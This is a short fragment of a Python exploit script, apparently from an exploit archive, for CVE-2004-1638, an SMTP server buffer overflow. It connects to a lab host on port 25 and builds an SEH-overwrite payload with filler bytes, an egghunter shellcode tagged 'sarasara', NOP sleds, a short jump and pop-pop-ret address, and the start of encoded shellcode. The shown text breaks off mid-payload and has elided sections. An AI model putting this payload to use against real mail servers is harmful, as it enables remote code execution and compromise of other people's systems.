...
# Date: 20th June, 2020
# CVE ID: CVE-2004-1638
# Confirmed on release 2.51
...
a.connect(("192.168.56.112",25))
#buffer="A"*15000
buffer="A"*5368
buffer+="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x73\x61\x72\x61\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
buffer+="\x90"*20
buffer+="\xEB\xb5\x90\x90"  #nseh
buffer+="\x49\x2e\x9d\x0f"  #PPR
buffer+="sarasara"
buffer+="\x90"*50
#buffer+="\x0d\x3b\x00\x10"
buffer+=("\xdd\xc7\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49\x49\x49"
